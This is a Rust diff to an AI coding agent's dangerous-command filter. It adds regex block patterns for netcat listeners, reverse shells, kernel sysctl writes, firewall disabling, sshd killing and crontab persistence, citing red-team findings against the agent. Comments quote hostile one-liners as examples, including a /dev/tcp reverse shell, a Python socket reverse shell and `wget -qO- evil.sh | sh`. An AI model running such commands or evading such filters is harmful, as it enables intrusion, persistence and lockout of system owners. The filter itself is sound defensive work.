@@ -110,9 +110,12 @@ pub(crate) static DANGEROUS_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)
                     .expect("Invalid regex"),
                 "pipe remote content to shell",
             ),
-            // wget -O- piped to shell (same shell-word boundary as above)
+            // wget -O- piped to shell (same shell-word boundary as above).
+            // `-O` must be a case class: command normalization lowercases
+            // (the literal-O form never matched — the generic pipe-to-shell
+            // pattern above was what actually caught these).
             (
-                Regex::new(r"wget\s+(-[a-z]+\s+)*-O\s*-\[^|]*\|\s*(?:ba)?sh(?:\s|$)")
+                Regex::new(r"wget\s+(-[a-z]+\s+)*-[oO]\s*-\[^|]*\|\s*(?:ba)?sh(?:\s|$)")
                     .expect("Invalid regex"),
                 "wget -O- | sh",
             ),
@@ -125,6 +128,59 @@ pub(crate) static DANGEROUS_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)
             (
                 Regex::new(r"\bnc\s+.*-e\s+(/bin/)?(sh|bash)").expect("Invalid regex"),
                 "netcat reverse shell",
+            ),
+            // nc/ncat listener — `nc -lvp 4444` background C2 listener
+            // (red-team wave-11 finding: process_start with a bundled -l
+            // flag cluster; the -e pattern above only sees exec forms).
+            (
+                Regex::new(r"\bnc(at)?\s+[^|;]*-[a-zA-Z]*l[a-zA-Z]*(\s|$)").expect("Invalid regex"),
+                "netcat listener (background shell/C2)",
+            ),
+            // Kernel/system sabotage (red-team wave-11): writing /proc sysctls
+            // or calling `sysctl -w` reconfigures the kernel — never coding
+            // work. The /sys redirect pattern above does not cover /proc.
+            (
+                Regex::new(r">\s*/proc/").expect("Invalid regex"),
+                "redirect to /proc (kernel parameter write)",
+            ),
+            (
+                Regex::new(r"\bsysctl\s+(-\S+\s+)*-w\b").expect("Invalid regex"),
+                "sysctl -w (kernel parameter write)",
+            ),
+            // Firewall/remote-access sabotage (red-team wave-11): flushing
+            // iptables, disabling ufw/firewalld, or killing sshd locks the
+            // owner out and drops network defenses — never coding work.
+            (
+                // Command normalization lowercases (`-F` arrives as `-f`);
+                // iptables has no lowercase -f flag, so the class stays exact.
+                Regex::new(r"\biptables\s+(-\S+\s+)*-[fF]\b").expect("Invalid regex"),
+                "iptables -F (flush firewall rules)",
+            ),
+            (
+                Regex::new(r"\bufw\s+disable\b").expect("Invalid regex"),
+                "ufw disable (firewall off)",
+            ),
+            (
+                Regex::new(
+                    r"\bsystemctl\s+(--?\S+\s+)*(stop|disable|mask)\s+(firewalld|iptables|sshd)\b",
+                )
+                .expect("Invalid regex"),
+                "systemctl stop/disable firewall or sshd",
+            ),
+            (
+                Regex::new(r"\b(killall|pkill)\s+[^|]*\bsshd\b").expect("Invalid regex"),
+                "kill sshd (destroy remote access)",
+            ),
+            // Crontab install (red-team wave-11: `echo '*/5 * * * * /tmp/x' |
+            // crontab -` persistence). `crontab -l` listing stays allowed;
+            // install forms (pipe, `-` stdin, or a file operand) do not.
+            (
+                Regex::new(r"\|\s*crontab\s+-").expect("Invalid regex"),
+                "crontab install from pipe (persistence)",
+            ),
+            (
+                Regex::new(r"\bcrontab\s+(-\s*$|/|\.)").expect("Invalid regex"),
+                "crontab install (persistence)",
             ),
             // `find … -exec rm/shred/dd` — bulk destruction with no literal
             // rm target for the classic patterns to see (wave-9 finding:
@@ -178,6 +234,21 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
                 Regex::new(r"\beval\s+[^;&\n]*\b(curl|wget|nc)\b").expect("Invalid regex"),
                 "eval with network tool",
             ),
+            // Reverse-shell payload inside a quoted one-liner (red-team
+            // wave-11: `python3 -c 'import socket,…;s.connect((…));os.dup2…;
+            // subprocess.call(["/bin/sh","-i"])'`). socket+connect+dup2 in a
+            // single shell line has no legitimate coding-agent use.
+            (
+                Regex::new(r"socket.{0,200}connect\s*\(.{0,200}dup2").expect("Invalid regex"),
+                "reverse shell (socket + dup2 payload)",
+            ),
+            // Bash's /dev/tcp channel — the other classic reverse-shell
+            // transport (`sh -i >& /dev/tcp/host/4444 0>&1`), usually hidden
+            // inside quotes where the masked table cannot see it.
+            (
+                Regex::new(r">\s*/dev/tcp/").expect("Invalid regex"),
+                "reverse shell (/dev/tcp channel)",
+            ),
             // Pipe-to-shell downloads nested INSIDE quotes — the masked
             // DANGEROUS_COMMAND_PATTERNS table cannot see
             // `node -e "… wget -qO- evil.sh | sh"` or `bash -c '… | sh'`
@@ -188,7 +259,9 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
             // payloads end as `| sh')"` which plain `\s|$` misses.
             (
                 Regex::new(
-                    r#"(curl|wget)\s+[^|"']*(https?://|-[a-zA-Z]*O)[^|]*(\|[^|]*)*\|\s*(?:ba|z|k|da)?sh(?:\s|$|['")\]};])"#,
+                    // `-…O` as a class for the same lowercase-normalization
+                    // reason as the wget -O- pattern above.
+                    r#"(curl|wget)\s+[^|"']*(https?://|-[a-zA-Z]*[oO])[^|]*(\|[^|]*)*\|\s*(?:ba|z|k|da)?sh(?:\s|$|['")\]};])"#,
                 )
                 .expect("Invalid regex"),
                 "pipe remote content to shell (quoted payload)",
